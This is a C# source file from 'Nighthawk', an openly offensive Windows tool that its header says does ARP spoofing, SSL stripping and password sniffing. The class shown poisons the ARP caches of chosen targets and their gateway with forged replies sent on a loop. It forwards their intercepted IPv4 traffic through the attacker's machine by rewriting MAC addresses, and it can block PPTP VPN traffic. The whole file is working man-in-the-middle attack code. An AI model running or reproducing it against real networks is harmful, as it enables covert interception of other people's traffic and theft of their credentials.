using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Net;
using System.Threading;
using SharpPcap.WinPcap;
using PacketDotNet;

/**
Nighthawk - ARP/ND spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2011, 2012  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    /* ARP spoofing, IPv4 routing */
    public class ARPTools
    {
        // current device
        private WinPcapDevice device;

        public bool SpoofingStarted;
        private bool blockPPTP;

        // packet queues (packet storage for BG threads)
        public List<ARPPacket> PacketQueue = new List<ARPPacket>();
        private List<ARPPacket> threadQueue = new List<ARPPacket>();

        public List<Packet> PacketQueueRouting = new List<Packet>();
        private List<Packet> threadQueueRouting = new List<Packet>();

        public List<Target> SpoofingTargets1;
        public Target SpoofingTarget2;

        // simple IP - MAC table
        public Dictionary<string, PhysicalAddress> IPtoMACTargets1;
        
        private Thread workerSender;
        private Thread workerRouter;

        private DeviceInfo deviceInfo;
        private PhysicalAddress physicalAddress;

        public ARPTools(DeviceInfo deviceInfo)
        {
            device = deviceInfo.Device;
            this.deviceInfo = deviceInfo;
        }

        // start ARP spoofing (list of selected targets, gateway)
        public void StartSpoofing(List<Target> targets1, Target target2, bool blockPPTP)
        {
            this.blockPPTP = blockPPTP;

            SpoofingTargets1 = targets1;
            SpoofingTarget2 = target2;

            physicalAddress = deviceInfo.PMAC;
             
            // parse targets to a simple IP - MAC table
            IPtoMACTargets1 = new Dictionary<string, PhysicalAddress>();
            SpoofingTargets1.ForEach(t => IPtoMACTargets1.Add(t.IP, t.PMAC));

            // add a static ARP entry for our gateway
            StaticARP(SpoofingTarget2.IP, SpoofingTarget2.PMAC, deviceInfo.WinName, StaticARPOperation.Add);

            SpoofingStarted = true;

            PacketQueue.Clear();

            // create ARP sender worker
            workerSender = new Thread(new ThreadStart(WorkerSender));
            workerSender.Name = "ARP sender thread";
            workerSender.Start();

            // create IPv4 router worker
            workerRouter = new Thread(new ThreadStart(WorkerRouter));
            workerRouter.Name = "IPv4 router thread";
            workerRouter.Start();
        }

        // stop ARP spoofing
        public void StopSpoofing()
        {
            // remove a static ARP entry for our gateway
            if (SpoofingStarted) StaticARP(SpoofingTarget2.IP, SpoofingTarget2.PMAC, deviceInfo.WinName, StaticARPOperation.Remove);

            SpoofingStarted = false;

            // stop threads & re-ARP
            if (workerSender != null && workerSender.IsAlive)
            {
                ReArpTargets();
                workerSender.Join();
            }

            if (workerRouter != null && workerRouter.IsAlive)
            {
                ReArpTargets();
                workerRouter.Join();
            }

            // clear remaining queues
            threadQueue.Clear();
            threadQueueRouting.Clear();
            
            PacketQueue.Clear();
            PacketQueueRouting.Clear();
        }

        // static ARP entry manipulation (IP, MAC, friendly interface name, add/remove)
        public bool StaticARP(string IP, PhysicalAddress mac, string WinName, StaticARPOperation operation)
        {
            OperatingSystem system = Environment.OSVersion;

            // format MAC address
            var macString = Network.FriendlyPhysicalAddress(mac).Replace(":", "-").ToLower();

            // prepare process
            Process p = new Process();

            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            p.StartInfo.FileName = "cmd";

            // Vista, Windows 7/8 - use "netsh"
            if (system.Version.Major > 5)
            {
                if(operation == StaticARPOperation.Add)
                    p.StartInfo.Arguments = "/k netsh interface ip delete neighbors \"" + WinName + "\" " + IP + " && netsh interface ip add neighbors \"" + WinName + "\" " + IP + " " + macString + " && exit";
                else
                    p.StartInfo.Arguments = "/k netsh interface ip delete neighbors \"" + WinName + "\" " + IP + " && exit";

                p.Start();
                p.WaitForExit();

                p.Dispose();

                return true;
            }

            p.Dispose();

            return false;
        }

        // create ARP reply packet (sender IP, target IP, target's MAC)
        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC)
        {
            return GenerateARPReply(senderIP, targetIP, targetMAC, physicalAddress);
        }

        // create ARP reply packet (sender IP, target IP, target MAC, specific source MAC)
        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC, PhysicalAddress sourceMAC)
        {
            var ethernetPacket = new EthernetPacket(physicalAddress, targetMAC, EthernetPacketType.Arp);
            var arpPacket = new ARPPacket(ARPOperation.Response, targetMAC, IPAddress.Parse(targetIP), sourceMAC, IPAddress.Parse(senderIP));

            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        // send old ARP information to targets
        private void ReArpTargets()
        {
            // somewhere around 58 bytes for an ARP reply
            var sendQueue = new SendQueue(SpoofingTargets1.Count * 2 * 60);

            foreach (Target target1 in SpoofingTargets1)
            {
                sendQueue.Add(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC, target1.PMAC).Bytes);
                sendQueue.Add(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC, SpoofingTarget2.PMAC).Bytes);
            }

            device.SendQueue(sendQueue, SendQueueTransmitModes.Normal);
            sendQueue.Dispose();

            return;
        }

        // worker for sending ARP reply packets
        public void WorkerSender()
        {
            var sendQueue = new SendQueue((SpoofingTargets1.Count * 2 * 60) + 60);
            
            foreach (Target target1 in SpoofingTargets1)
            {
                // send fake replies to the gateway
                sendQueue.Add(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC).Bytes);

                // senda fake replies to targets
                sendQueue.Add(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC).Bytes);
            }

            while (SpoofingStarted)
            {
                sendQueue.Transmit(device, SendQueueTransmitModes.Normal);

                Thread.Sleep(2500);
            }

            sendQueue.Dispose();

            return;
        }

        // worker for routing IPv4 packets
        public void WorkerRouter()
        {
            while (SpoofingStarted)
            {
                // size of packets - needed for send queue (set some starting value - it seems the length is not set correctly during threadQueue packet copying)
                int bufferSize = 2048;

                // copy packets to thread's packet storage (threadRoutingQueue)
                lock (PacketQueueRouting)
                {
                    foreach (Packet packet in PacketQueueRouting)
                    {
                        threadQueueRouting.Add(packet);
                        bufferSize += packet.Bytes.Length;
                    }

                    PacketQueueRouting.Clear();
                }

                if (threadQueueRouting.Count > 0)
                {
                    var sendQueue = new SendQueue(bufferSize);

                    // loop through packets and change MAC addresses
                    foreach (Packet packet in threadQueueRouting)
                    {
                        if (packet == null) continue;

                        var ethernetPacket = (packet as EthernetPacket);
                        if (ethernetPacket == null) continue;

                        var ip = (packet is IpPacket ? (IpPacket)packet : IpPacket.GetEncapsulated(packet));

                        // discard invalid packets
                        if (ip is IPv4Packet && (((IPv4Packet)ip).Checksum == 0 || !((IPv4Packet)ip).ValidIPChecksum)) continue;

                        var sourceIP = ip.SourceAddress.ToString();
                        var destinationIP = ip.DestinationAddress.ToString();

                        var sourceMAC = ethernetPacket.SourceHwAddress.ToString();
                        var destinationMAC = ethernetPacket.DestinationHwAddress.ToString();

                        if (destinationMAC == sourceMAC) continue;
                        
                        // block PPTP if necessary (exclude local computer)
                        if (blockPPTP && sourceIP != deviceInfo.IP && destinationIP != deviceInfo.IP)
                        {
                            // block GRE
                            if (ip.Protocol == IPProtocolType.GRE) continue;

                            // check for port 1723 and block it
                            if (ip.Protocol == IPProtocolType.TCP)
                            {
                                var tcp = TcpPacket.GetEncapsulated(packet);

                                if (tcp != null && (tcp.SourcePort == 1723 || tcp.DestinationPort == 1723)) continue;
                            }
                        }
                        
                        // incoming packets - change destination MAC back to target's MAC
                        if (IPtoMACTargets1.ContainsKey(destinationIP) && (destinationMAC != IPtoMACTargets1[destinationIP].ToString()))
                        {
                            ethernetPacket.SourceHwAddress = physicalAddress;
                            ethernetPacket.DestinationHwAddress = IPtoMACTargets1[destinationIP];

                            if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                        }

                        // outgoing packets - change destination MAC to gateway's MAC
                        if (IPtoMACTargets1.ContainsKey(sourceIP) && (destinationMAC != SpoofingTarget2.PMAC.ToString()))
                        {
                            ethernetPacket.SourceHwAddress = physicalAddress;
                            ethernetPacket.DestinationHwAddress = SpoofingTarget2.PMAC;

                            if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                        }
                    }

                    sendQueue.Transmit(device, SendQueueTransmitModes.Normal);
                    sendQueue.Dispose();

                    threadQueueRouting.Clear();
                }
                else
                {
                    Thread.Sleep(1);
                }
            }

            return;
        }
    }

    public enum StaticARPOperation
    {
        Add,
        Remove
    }
}
